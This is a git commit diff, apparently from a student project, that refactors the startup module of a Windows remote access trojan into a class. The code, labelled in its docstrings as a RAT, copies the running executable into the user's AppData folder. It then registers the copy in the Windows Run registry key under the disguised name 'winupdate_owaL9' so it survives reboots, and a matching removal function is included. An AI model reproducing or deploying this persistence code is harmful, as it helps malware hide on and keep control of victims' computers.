a5c3c5f141d178f1da76f2e44898b79236ea4d12
Rodrigo Martín Núñez <r.martin.nunez@student.tue.nl>
2022-06-17 10:46:00 +0200

    Added structure

--- src/client/startup.py
+++ src/client/startup.py
@@ -4,16 +4,38 @@ import sys
 import winreg
 
 
-def add_startup():
-    file_path = os.path.realpath(sys.argv[0])
-    hidden_path = os.path.join(os.path.normpath(os.environ["APPDATA"]), os.path.basename(file_path))
-    shutil.copyfile(file_path, hidden_path)
-    regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
-    winreg.SetValueEx(regkey, "winupdate_owaL9", 0, winreg.REG_SZ, f"\"{hidden_path}\"")
-    winreg.CloseKey(regkey)
-    
-def remove_startup():
+class Startup:
+    """
+    Adds or removes RAT to startup apps
+    """
 
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
-    winreg.DeleteValue(key, "winupdate_owaL9")
-    winreg.CloseKey(key)
+    def __init__(self) -> None:
+        """
+        Constructor
+        """
+        pass
+
+    def add_startup(self):
+        """
+        Adds .exe RAT file to startup using Window's registry
+        """
+
+        file_path = os.path.realpath(sys.argv[0])
+        hidden_path = os.path.join(os.path.normpath(os.environ["APPDATA"]), os.path.basename(file_path))
+        shutil.copyfile(file_path, hidden_path)
+
+        regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                0, winreg.KEY_ALL_ACCESS)
+
+        winreg.SetValueEx(regkey, "winupdate_owaL9", 0, winreg.REG_SZ, f"\"{hidden_path}\"")
+        winreg.CloseKey(regkey)
+    
+    def remove_startup(self):
+        """
+        Removes .exe file to startup
+        """
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                             0, winreg.KEY_ALL_ACCESS)
+
+        winreg.DeleteValue(key, "winupdate_owaL9")
+        winreg.CloseKey(key)
